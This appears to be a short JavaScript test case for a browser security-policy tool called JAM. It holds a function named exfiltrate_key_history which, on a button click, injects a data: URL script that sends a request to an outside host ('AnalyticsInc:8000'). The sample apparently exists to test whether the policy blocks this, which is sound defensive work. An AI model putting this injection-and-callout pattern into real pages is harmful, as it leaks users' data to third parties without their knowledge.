
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var data$$18 = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);';
  var URL = "data:text/javascript;," + encodeURIComponent(data$$18);
  var script = document.createElement("script");
  script.src = URL;
  document.getElementsByTagName("head")[0].appendChild(script);
}
document.getElementById("test").onclick = exfiltrate_key_history

}

JAM.stopProfile('load');
